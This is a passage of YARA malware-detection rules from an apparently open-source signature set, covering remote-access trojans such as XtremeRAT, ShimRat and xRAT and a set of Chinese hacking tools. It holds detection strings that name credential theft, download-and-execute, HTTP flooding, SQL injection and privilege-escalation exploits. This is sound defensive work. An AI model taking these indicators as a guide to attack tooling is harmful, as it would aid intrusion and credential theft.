FC FF FF 83 C4  04 68 E8 03 00 00 FF D7 56 E8 54 12 00 00 E9 AE  FE FF FF E8 13 F5 FF FF }\n\n        $MZ = \"MZ\"\n    condition:\n        $MZ at 0 and all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule ShadowTech_2\n{\n    meta:\n        description = \"ShadowTech RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /\\#(S)trings/\n        $string2 = /\\#(G)UID/\n        $string3 = /\\#(B)lob/\n        $string4 = /(S)hadowTech Rat\\.exe/\n        $string5 = /(S)hadowTech_Rat/\n\n    condition:\n        all of them\n}\nrule ShadowTech\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/ShadowTech\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"ShadowTech\" nocase\n\t\t$b = \"DownloadContainer\"\n\t\t$c = \"MySettings\"\n\t\t$d = \"System.Configuration\"\n\t\t$newline = \"#-@NewLine@-#\" wide\n\t\t$split = \"pSIL\" wide\n\t\t$key = \"ESIL\" wide\n\n\tcondition:\n\t\t4 of them\n}\n\nrule shimrat: RAT\n{\n meta:\n  description = \"Detects ShimRat and the ShimRat loader\"\n  author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n  date = \"20/11/2015\"\n  ref = \"https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/\"\n  \n strings:\n  $dll = \".dll\"\n  $dat = \".dat\"\n  $headersig = \"QWERTYUIOPLKJHG\"\n  $datasig = \"MNBVCXZLKJHGFDS\"\n  $datamarker1 = \"Data$$00\"\n  $datamarker2 = \"Data$$01%c%sData\"\n  $cmdlineformat = \"ping localhost -n 9 /c %s > nul\"\n  $demoproject_keyword1 = \"Demo\"\n  $demoproject_keyword2 = \"Win32App\"\n  $comspec = \"COMSPEC\"\n  $shim_func1 = \"ShimMain\"\n  $shim_func2 = \"NotifyShims\"\n  $shim_func3 = \"GetHookAPIs\"\n\n\n condition:\n  ($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3)\n}\n\nrule shimratreporter: RAT\n{\n meta:\n  description = \"Detects ShimRatReporter\"\n  author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"\n  date = \"20/11/2015\"\n  ref = \"https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/\"\n\n\n strings:\n  $IpInfo = \"IP-INFO\"\n  $NetworkInfo = \"Network-INFO\"\n  $OsInfo = \"OS-INFO\"\n  $ProcessInfo = \"Process-INFO\"\n  $BrowserInfo = \"Browser-INFO\"\n  $QueryUserInfo = \"QueryUser-INFO\"\n  $UsersInfo = \"Users-INFO\"\n  $SoftwareInfo = \"Software-INFO\"\n  $AddressFormat = \"%02X-%02X-%02X-%02X-%02X-%02X\"\n  $proxy_str = \"(from environment) = %s\"\n\n  $netuserfun = \"NetUserEnum\"\n  $networkparams = \"GetNetworkParams\"\n\n condition:\n  all of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\n\nrule TerminatorRat : RAT \n{\n\tmeta:\n\t\tdescription = \"Terminator RAT\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-10-24\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"http://www.fireeye.com/blog/technical/malware-research/2013/10/evasive-tactics-terminator-rat.html\" \n\n\tstrings:\n\t\t$a = \"Accelorator\"\n\t\t$b = \"<html><title>12356</title><body>\"\n\n\tcondition:\n\t\tall of them\n}\n\n\n\nrule TROJAN_Notepad_shell_crew : Trojan {\n        meta:\n                author = \"RSA_IR\"\n                Date     = \"4Jun13\"\n                File     = \"notepad.exe v 1.1\"\n                MD5      = \"106E63DBDA3A76BEEB53A8BBD8F98927\"\n        strings:\n                $s1 = \"75BAA77C842BE168B0F66C42C7885997\"\n                $s2 = \"B523F63566F407F3834BCC54AAA32524\"\n        condition:\n                $s1 or $s2\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule Xtreme\n{\n    meta:\n        description = \"Xtreme RAT\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /(X)tremeKeylogger/ wide ascii\n        $string2 = /(X)tremeRAT/ wide ascii\n        $string3 = /(X)TREMEUPDATE/ wide ascii\n        $string4 = /(S)TUBXTREMEINJECTED/ wide ascii\n\n        $unit1 = /(U)nitConfigs/ wide ascii\n        $unit2 = /(U)nitGetServer/ wide ascii\n        $unit3 = /(U)nitKeylogger/ wide ascii\n        $unit4 = /(U)nitCryptString/ wide ascii\n        $unit5 = /(U)nitInstallServer/ wide ascii\n        $unit6 = /(U)nitInjectServer/ wide ascii\n        $unit7 = /(U)nitBinder/ wide ascii\n        $unit8 = /(U)nitInjectProcess/ wide ascii\n\n    condition:\n        5 of them\n}\n\nrule xtreme_rat : Trojan\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"23/02/2013\"\n\t\tdescription=\"Xtreme RAT\"\n\t\n\tstrings:\n\t\t$signature1={58 00 54 00 52 00 45 00 4D 00 45} /*X.T.R.E.M.E*/\n\t\t\n\tcondition:\n\t\t$signature1\n}\n\nrule XtremeRATCode : XtremeRAT Family \n{\n    meta:\n        description = \"XtremeRAT code features\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n    \n    strings:\n        // call; fstp st\n        $ = { E8 ?? ?? ?? ?? DD D8 }\n        // hiding string\n        $ = { C6 85 ?? ?? ?? ?? 4D C6 85 ?? ?? ?? ?? 70 C6 85 ?? ?? ?? ?? 64 C6 85 ?? ?? ?? ?? 62 C6 85 ?? ?? ?? ?? 6D }\n    \n    condition:\n        all of them\n}\n\nrule XtremeRATStrings : XtremeRAT Family\n{\n    meta:\n        description = \"XtremeRAT Identifying Strings\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n        \n    strings:\n        $ = \"dqsaazere\"\n        $ = \"-GCCLIBCYGMING-EH-TDM1-SJLJ-GTHR-MINGW32\"\n        \n    condition:\n        all of them\n}\n\nrule XtremeRAT : Family\n{\n    meta:\n        description = \"XtremeRAT\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n        \n    condition:\n        XtremeRATCode or XtremeRATStrings\n}\n\nrule xtremrat : rat\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"Xtrem RAT v3.5\"\n\t\tdate = \"2012-07-12\" \n\t\tversion = \"1.0\" \n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t$a = \"XTREME\" wide\n\t\t$b = \"XTREMEBINDER\" wide\n\t\t$c = \"STARTSERVERBUFFER\" wide\n\t\t$d = \"SOFTWARE\\\\XtremeRAT\" wide\n\t\t$e = \"XTREMEUPDATE\" wide\n\t\t$f = \"XtremeKeylogger\" wide\n\t\t$g = \"myversion|3.5\" wide\n\t\t$h = \"xtreme rat\" wide nocase\n\tcondition:\n\t\t2 of them\n}\n\nrule xtreme_rat_0\n{ \n\tmeta:\n\t\tmaltype = \"Xtreme RAT\"\n\t\treference = \"http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"5156\"\n\t\t$data=\"windows\\\\system32\\\\sethc.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"AppData\\\\Local\\\\Temp\\\\Microsoft Word.exe\"\n\tcondition:\n\t\tall of them\n}\n\nrule xtreme_rat_1\n{ \n\tmeta:\n\t\tmaltype = \"Xtreme RAT\"\n\t\tref = \"https://github.com/reed1713\"\n\t\treference = \"http://blog.trendmicro.com/trendlabs-security-intelligence/xtreme-rat-targets-israeli-government/\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"5156\"\n\t\t$data=\"windows\\\\system32\\\\sethc.exe\"\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"AppData\\\\Local\\\\Temp\\\\Microsoft Word.exe\"\n\tcondition:\n\t\tall of them\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule zoxPNG_RAT\n{\n    meta:\n        Author      = \"Novetta Advanced Research Group\"\n        Date        = \"2014/11/14\"\n        Description = \"ZoxPNG RAT, url inside\"\n        Reference   = \"http://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf\"\n\n    strings: \n        $url = \"png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&ty=58\"\n\n    condition: \n        $url\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\nrule jRAT_conf : RAT \n{\n\tmeta:\n\t\tdescription = \"jRAT configuration\" \n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-10-11\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"https://github.com/MalwareLu/config_extractor/blob/master/config_jRAT.py\" \n\t\tref2 = \"http://www.ghettoforensics.com/2013/10/dumping-malware-configuration-data-from.html\" \n\n\tstrings:\n\t\t$a = /port=[0-9]{1,5}SPLIT/ \n\n\tcondition: \n\t\t$a\n}\n\nrule xRAT : RAT\n{\n    meta:\n        author = \" Kevin Breen <kevin@techanarchy.net>\"\n        date = \"2014/04\"\n        ref = \"http://malwareconfig.com/stats/xRat\"\n        maltype = \"Remote Access Trojan\"\n        filetype = \"exe\"\n\n    strings:\n        $v1a = \"DecodeProductKey\"\n        $v1b = \"StartHTTPFlood\"\n        $v1c = \"CodeKey\"\n        $v1d = \"MESSAGEBOX\"\n        $v1e = \"GetFilezillaPasswords\"\n        $v1f = \"DataIn\"\n        $v1g = \"UDPzSockets\"\n        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}\n\n        $v2a = \"<URL>k__BackingField\"\n        $v2b = \"<RunHidden>k__BackingField\"\n        $v2c = \"DownloadAndExecute\"\n        $v2d = \"-CHECK & PING -n 2 127.0.0.1 & EXIT\" wide\n        $v2e = \"england.png\" wide\n        $v2f = \"Showed Messagebox\" wide\n    condition:\n        all of ($v1*) or all of ($v2*)\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule xRAT20 : RAT\n{\nmeta:\n\tauthor = \"Rottweiler\"\n\tdate = \"2015-08-20\"\n\tdescription = \"Identifies xRAT 2.0 samples\"\n\tmaltype = \"Remote Access Trojan\"\n\thash0 = \"cda610f9cba6b6242ebce9f31faf5d9c\"\n\thash1 = \"60d7b0d2dfe937ac6478807aa7043525\"\n\thash2 = \"d1b577fbfd25cc5b873b202cfe61b5b8\"\n\thash3 = \"1820fa722906569e3f209d1dab3d1360\"\n\thash4 = \"8993b85f5c138b0afacc3ff04a2d7871\"\n\thash5 = \"0c231ed8a800b0f17f897241f1d5f4e3\"\n\thash1 = \"60d7b0d2dfe937ac6478807aa7043525\"\n\thash8 = \"2c198e3e0e299a51e5d955bb83c62a5e\"\n\tsample_filetype = \"exe\"\n\tyaragenerator = \"https://github.com/Xen0ph0n/YaraGenerator\"\nstrings:\n\t$string0 = \"GetDirectory: File not found\" wide\n\t$string1 = \"<>m__Finally8\"\n\t$string2 = \"Secure\"\n\t$string3 = \"ReverseProxyClient\"\n\t$string4 = \"DriveDisplayName\"\n\t$string5 = \"<IsError>k__BackingField\"\n\t$string6 = \"set_InstallPath\"\n\t$string7 = \"memcmp\"\n\t$string8 = \"urlHistory\"\n\t$string9 = \"set_AllowAutoRedirect\"\n\t$string10 = \"lpInitData\"\n\t$string11 = \"reader\"\n\t$string12 = \"<FromRawDataGlobal>d__f\"\n\t$string13 = \"mq.png\" wide\n\t$string14 = \"remove_KeyDown\"\n\t$string15 = \"ProtectedData\"\n\t$string16 = \"m_hotkeys\"\n\t$string17 = \"get_Hour\"\n\t$string18 = \"\\\\mozglue.dll\" wide\ncondition:\n\t18 of them\n}\n\nrule mswin_check_lm_group {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mswin_check_lm_group.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"115d87d7e7a3d08802a9e5fd6cd08e2ec633c367\"\n\tstrings:\n\t\t$s1 = \"Valid_Global_Groups: checking group membership of '%s\\\\%s'.\" fullword ascii\n\t\t$s2 = \"Usage: %s [-D domain][-G][-P][-c][-d][-h]\" fullword ascii\n\t\t$s3 = \"-D    default user Domain\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 380KB and all of them\n}\n\nrule WAF_Bypass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WAF-Bypass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"860a9d7aac2ce3a40ac54a4a0bd442c6b945fa4e\"\n\tstrings:\n\t\t$s1 = \"Email: blacksplitn@gmail.com\" fullword wide\n\t\t$s2 = \"User-Agent:\" fullword wide\n\t\t$s3 = \"Send Failed.in RemoteThread\" fullword ascii\n\t\t$s4 = \"www.example.com\" fullword wide\n\t\t$s5 = \"Get Domain:%s IP Failed.\" fullword ascii\n\t\t$s6 = \"Connect To Server Failed.\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 7992KB and 5 of them\n}\n\nrule Guilin_veterans_cookie_spoofing_tool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"06b1969bc35b2ee8d66f7ce8a2120d3016a00bb1\"\n\tstrings:\n\t\t$s0 = \"kernel32.dll^G\" fullword ascii\n\t\t$s1 = \"\\\\.Sus\\\"B\" fullword ascii\n\t\t$s4 = \"u56Load3\" fullword ascii\n\t\t$s11 = \"O MYTMP(iM) VALUES (\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1387KB and all of them\n}\n\nrule MarathonTool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MarathonTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"084a27cd3404554cc799d0e689f65880e10b59e3\"\n\tstrings:\n\t\t$s0 = \"MarathonTool\" ascii\n\t\t$s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n\t\t$s18 = \"SELECT UNICODE(SUBSTRING((system_user),{0},1))\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1040KB and all of them\n}\n\nrule PLUGIN_TracKid {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file TracKid.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a114181b334e850d4b33e9be2794f5bb0eb59a09\"\n\tstrings:\n\t\t$s0 = \"E-mail: cracker_prince@163.com\" fullword ascii\n\t\t$s1 = \".\\\\TracKid Log\\\\%s.txt\" fullword ascii\n\t\t$s2 = \"Coded by prince\" fullword ascii\n\t\t$s3 = \"TracKid.dll\" fullword ascii\n\t\t$s4 = \".\\\\TracKid Log\" fullword ascii\n\t\t$s5 = \"%08x -- %s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule Pc_pc2015 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pc2015.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"de4f098611ac9eece91b079050b2d0b23afe0bcb\"\n\tstrings:\n\t\t$s0 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s1 = \"LON\\\\OD\\\\O-\\\\O)\\\\O%\\\\O!\\\\O=\\\\O9\\\\O5\\\\O1\\\\O\" fullword ascii\n\t\t$s8 = \"%s%08x.001\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 309KB and all of them\n}\n\nrule sekurlsa {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\tstrings:\n\t\t$s1 = \"Bienvenue dans un processus distant\" fullword wide\n\t\t$s2 = \"Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur\" wide\n\t\t$s3 = \"SECURITY\\\\Policy\\\\Secrets\" fullword wide\n\t\t$s4 = \"Injection de donn\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1150KB and all of them\n}\n\nrule mysqlfast {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file mysqlfast.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"32b60350390fe7024af7b4b8fbf50f13306c546f\"\n\tstrings:\n\t\t$s2 = \"Invalid password hash: %s\" fullword ascii\n\t\t$s3 = \"-= MySql Hash Cracker =- \" fullword ascii\n\t\t$s4 = \"Usage: %s hash\" fullword ascii\n\t\t$s5 = \"Hash: %08lx%08lx\" fullword ascii\n\t\t$s6 = \"Found pass: \" fullword ascii\n\t\t$s7 = \"Pass not found\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 900KB and 4 of them\n}\n\nrule DTools2_02_DTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file DTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9f99771427120d09ec7afa3b21a1cb9ed720af12\"\n\tstrings:\n\t\t$s0 = \"kernel32.dll\" ascii\n\t\t$s1 = \"TSETPASSWORDFORM\" fullword wide\n\t\t$s2 = \"TGETNTUSERNAMEFORM\" fullword wide\n\t\t$s3 = \"TPORTFORM\" fullword wide\n\t\t$s4 = \"ShellFold\" fullword ascii\n\t\t$s5 = \"DefaultPHotLigh\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule dll_PacketX {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tscore = 50\n\t\thash = \"3f0908e0a38512d2a4fb05a824aa0f6cf3ba3b71\"\n\tstrings:\n\t\t$s9 = \"[Failed to load winpcap packet.dll.\" wide\n\t\t$s10 = \"PacketX Version\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1920KB and all of them\n}\n\nrule SqlDbx_zhs {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SqlDbx_zhs.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e34228345498a48d7f529dbdffcd919da2dea414\"\n\tstrings:\n\t\t$s0 = \"S.failed_logins \\\"Failed Login Attempts\\\", \" fullword ascii\n\t\t$s7 = \"SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE\" fullword ascii\n\t\t$s8 = \"SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'\" ascii\n\t\t$s9 = \"bcp.exe <:schema:>.<:table:> out \\\"<:file:>\\\" -n -S <:server:> -U <:user:> -P <:\" ascii\n\t\t$s11 = \"L.login_policy_name AS \\\"Login Policy\\\", \" fullword ascii\n\t\t$s12 = \"mailto:support@sqldbx.com\" fullword ascii\n\t\t$s15 = \"S.last_login_time \\\"Last Login\\\", \" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and 4 of them\n}\n\nrule ms10048_x86 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms10048-x86.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e57b453966e4827e2effa4e153f2923e7d058702\"\n\tstrings:\n\t\t$s1 = \"[ ] Resolving PsLookupProcessByProcessId\" fullword ascii\n\t\t$s2 = \"The target is most likely patched.\" fullword ascii\n\t\t$s3 = \"Dojibiron by Ronald Huizer, (c) master@h4cker.us .\" fullword ascii\n\t\t$s4 = \"[ ] Creating evil window\" fullword ascii\n\t\t$s5 = \"%sHANDLEF_INDESTROY\" fullword ascii\n\t\t$s6 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 4 of them\n}\n\nrule Dos_ch {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ch.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"60bbb87b08af840f21536b313a76646e7c1f0ea7\"\n\tstrings:\n\t\t$s0 = \"/Churraskito/-->Usage: Churraskito.exe \\\"command\\\" \" fullword ascii\n\t\t$s4 = \"fuck,can't find WMI process PID.\" fullword ascii\n\t\t$s5 = \"/Churraskito/-->Found token %s \" fullword ascii\n\t\t$s8 = \"wmiprvse.exe\" fullword ascii\n\t\t$s10 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\t\t$s17 = \"WinSta0\\\\Default\" fullword ascii  /* Goodware String - occured 22 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 260KB and 3 of them\n}\n\nrule DUBrute_DUBrute {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file DUBrute.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8aaae91791bf782c92b97c6e1b0f78fb2a9f3e65\"\n\tstrings:\n\t\t$s1 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n\t\t$s2 = \"IP - 0; Login - 0; Password - 0; Combination - 0\" fullword ascii\n\t\t$s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n\t\t$s4 = \"UBrute.com\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1020KB and all of them\n}\n\nrule CookieTools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CookieTools.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be\"\n\tstrings:\n\t\t$s0 = \"http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=\" fullword ascii\n\t\t$s2 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s3 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n\t\t$s8 = \"OnGetPasswordP\" fullword ascii\n\t\t$s12 = \"http://www.chinesehack.org/\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 2 of them\n}\n\nrule update_PcInit {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PcInit.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a6facc4453f8cd81b8c18b3b3004fa4d8e2f5344\"\n\tstrings:\n\t\t$s1 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s2 = \"%s%08x.001\" fullword ascii\n\t\t$s3 = \"Global\\\\ps%08x\" fullword ascii\n\t\t$s4 = \"drivers\\\\\" fullword ascii /* Goodware String - occured 2 times */\n\t\t$s5 = \"StrStrA\" fullword ascii /* Goodware String - occured 43 times */\n\t\t$s6 = \"StrToIntA\" fullword ascii /* Goodware String - occured 44 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule dat_NaslLib {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file NaslLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"fb0d4263118faaeed2d68e12fab24c59953e862d\"\n\tstrings:\n\t\t$s1 = \"nessus_get_socket_from_connection: fd <%d> is closed\" fullword ascii\n\t\t$s2 = \"[*] \\\"%s\\\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d\" fullword ascii\n\t\t$s3 = \"A FsSniffer backdoor seems to be running on this port%s\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1360KB and all of them\n}\n\nrule Dos_1 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file 1.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b554f0687a12ec3a137f321cc15e052ff219f28c\"\n\tstrings:\n\t\t$s1 = \"/churrasco/-->Usage: Churrasco.exe \\\"command to run\\\"\" fullword ascii\n\t\t$s2 = \"/churrasco/-->Done, command should have ran as SYSTEM!\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule OtherTools_servu {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file svu.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5c64e6879a9746a0d65226706e0edc7a\"\n\tstrings:\n\t\t$s0 = \"MZKERNEL32.DLL\" fullword ascii\n\t\t$s1 = \"UpackByDwing@\" fullword ascii\n\t\t$s2 = \"GetProcAddress\" fullword ascii\n\t\t$s3 = \"WriteFile\" fullword ascii\n\tcondition:\n\t\t$s0 at 0 and filesize < 50KB and all of them\n}\n\nrule ustrrefadd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ustrrefadd.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b371b122460951e74094f3db3016264c9c8a0cfa\"\n\tstrings:\n\t\t$s0 = \"E-Mail  : admin@luocong.com\" fullword ascii\n\t\t$s1 = \"Homepage: http://www.luocong.com\" fullword ascii\n\t\t$s2 = \": %d  -  \" fullword ascii\n\t\t$s3 = \"ustrreffix.dll\" fullword ascii\n\t\t$s5 = \"Ultra String Reference plugin v%d.%02d\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 320KB and all of them\n}\n\nrule XScanLib {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file XScanLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c5cb4f75cf241f5a9aea324783193433a42a13b0\"\n\tstrings:\n\t\t$s4 = \"XScanLib.dll\" fullword ascii\n\t\t$s6 = \"Ports/%s/%d\" fullword ascii\n\t\t$s8 = \"DEFAULT-TCP-PORT\" fullword ascii\n\t\t$s9 = \"PlugCheckTcpPort\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 360KB and all of them\n}\n\nrule IDTools_For_WinXP_IdtTool {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IdtTool.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ebab6e4cb7ea82c8dc1fe4154e040e241f4672c6\"\n\tstrings:\n\t\t$s2 = \"IdtTool.sys\" fullword ascii\n\t\t$s4 = \"Idt Tool bY 